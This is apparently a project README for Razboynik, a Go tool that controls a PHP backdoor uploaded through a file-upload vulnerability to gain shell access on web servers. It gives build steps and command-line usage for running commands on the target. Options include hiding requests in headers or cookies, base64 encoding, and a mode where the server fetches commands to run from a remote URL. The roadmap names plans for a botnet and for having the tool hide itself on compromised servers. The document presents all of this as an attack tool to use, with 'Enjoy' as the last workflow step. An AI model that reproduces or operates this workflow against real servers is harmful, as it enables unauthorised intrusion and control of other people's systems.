(screen)

#Razboynik - разбойник
Razboynik, gain reverse shell with a simple PHP backdoor

##Current version
2.0.0

##How it works ?
- Upload the infected file on a webserver (thanks to file upload vulnerability)
- Start Razboynik with the right information
- You have a reverse shell on the server
- Enjoy

##Why Razboynik ?
Where FurezApi Framework and later FurezExploit (C++ brother) were boring and long to setup and install, Razboynik learnt about those mistakes and fix it. 
Razboynik is giving you a better interface to handle the server (nothing better than shell). Easier to install, faster to use, better to customize and hot new functionnalities:
- Encoding all the request (Crypto on the way)
- Infected requests by GET, POST, Headers or Cookies
- Logs every result in file
- Better interface
- Easy to plug bundle and plugin thanks to modules
- Proxied tunnel (on the way)

##FurezLegacy ?
Razboynik is the FurezLegacy project on Golang.
FurezApi Framework was a little PHP website that exploit PHP backdoor.
It allow you to exploit file upload vulnerability on web server.
The main goal was pretty simple : Test every possibilities of infected files to upload, and then, if the upload is successful:

- giving you a user interface to manage datas
- allowing you to do what you want on server

Show the folder structure of the website ? Show a specific file ? Zip content ? Download content ? Upload or even delete ? If the API succeed to be upload on the server. You're the new king of this one!

##Install & Run
###Requirements
These requirements are necessary :
- `Golang`

###Dependencies
These dependencies will be install:
- `eatbytes/sysgo` (Small abstraction of system command)
- `spf13/cobra` (Usefull utility to handle flag and parse command)
- `fatih/color` (Great colors to push on terminal)
- `golang library` (fmt, strings, buffer, etc...)

These dependencies are already in the vendor folder:
- `eatbytes/razboy` (Business logic and core of razboynik)
- `chzyer/readline` (Implementation of readline to loop on command)

###Installation
Instructions to build the app:
- `git clone https://github.com/EatBytes/razboynik.git` (or SSH if you want)
- `cd razboynik`
- `go get` (install dependencies)
- `go build` or `go install`

The `go build` command will build the project locally (it means, only create a binary in the folder). `go install` create a binary available everywhere (if the $GOBIN folder is in $PATH).

##Demo
[![asciicast](https://asciinema.org/a/92281.png)](https://asciinema.org/a/92281)

Let's suppose you find a file upload vulnerability in a website and you upload the script available in `res/backdoor` folder.
Now the url of your script could be (as example) : http://{website}/uploads/script.php

With this statement we can use razboynik as it follow :
- `./razboynik run http://{website}/uploads/script.php`

If you want to change the parameter sent, add -p flag and precise it. Like : `./razboynik run [URL] -p myParameter`.
By default the parameter is "razboynik". Parameter is the name of the field or header or cookie (depends on method) sent to server. If the method is GET, razboynik will simply add at the end of the url = ?razboynik={request}.

If you want to change the method, add -m flag as : `./razboynik run [URL] -m POST`.
By default, method is set to GET. You have the choice between : GET, POST, HEADER (evil request will be set in headers), COOKIE.

For more option you can add -h flag. Or type `./razboynik help`.

##API
###run
Run a reverse shell with specified configuration

ARGUMENTS:
- `[URL]`: (string) Url of the target. Ex: `http://localhost/script.php`

OPTIONS: 
- `-m, --method`: (string) Method to use. Ex: `-m POST` (default: "GET")
- `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
- `-s, --shellmethod`: (int) Shellmethod to use. Ex: `-s 0` (default: 0) [0 => system(), 1 => shell_exec()]
- `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: `FromRussiaWithLove<3`)
- `-r, --raw`: (bool) If set, send the request without base64 encoding
- `--proxy`: (string) Possible proxy to use. Ex: `--proxy http://localhost:8080` (default: nil)
- `-c, --crypt`: (Not available)

###generate
(Not available yet)

###scan
Scan a website to identify what shell method and method works on it.

ARGUMENTS:
- `[URL]`: (string) Url of the target. Ex: `http://localhost/script.php`

OPTIONS:
- `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
- `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: `FromRussiaWithLove<3`)

###invisible
Execute a raw command available at an url (referer). Ex: http://website/cmd.txt point to `'echo 1;'` in body, then I can do : 
- `[URL] http://website/cmd.txt`

ARGUMENTS:
- `[URL]`: (string) Url of the target. Ex: `http://localhost/script.php`
- `[REFERER]`: (string) Url that the server will call to get the cmd to execute. Ex: `http://website.com/cmd-i-want-to-execute.txt`

###api
(TO DO...)

###encode / decode
Encode or decode string.

ARGUMENTS:
- `[STR]`: (string) String to encode or decode in base64.

Ex: 
- `encode hello` => `aGVsbG8=`
- `decode aGVsbG8=` => `hello`

##GO DOC

##Roadmap
###~~1.5.0 (DONE)~~
- ~~Raw request~~
- ~~Better error in razboy (core)~~
- ~~Add more information when run fail~~
- ~~Add cookie method~~
- ~~Implement optional key protection~~
- ~~Add base64 encoding and decoding to root~~
- ~~Add invisible method~~

###2.0.0 (CURRENT)
- Complete refactoring on Cobra version
- More stability
- Better coding standarts
- Proxy available (works like a charm with mitmproxy)
- Web server (REST API)
- Zip
- Vim
- Crazy autocomplete like on your favorite shell
- Vendor folder to have same version of lib
- New modules system, more easy and powerful
- More documentation

###2.1.0 (IN PROGRESS)
- Add `./bin` folder with binaries
- More documentation
- Create a botnet. Handle multiple server at the same time
- Config file (necessary with botnet)
- Proxied tunnel
- Crypto ?
- Hide itself once on server
